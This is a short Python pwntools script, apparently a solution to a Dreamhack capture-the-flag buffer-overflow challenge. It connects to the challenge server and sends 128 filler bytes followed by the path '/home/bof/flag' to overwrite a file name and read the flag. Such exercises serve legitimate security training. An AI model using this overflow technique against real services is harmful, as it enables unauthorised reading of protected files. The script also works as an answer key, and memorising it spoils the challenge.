from pwn import *
p = remote('host3.dreamhack.games', 16582)
payload = b'A'*128
payload += b'/home/bof/flag\0'
p.recvuntil(b"meow? ")
p.sendline(payload)
p.interactive()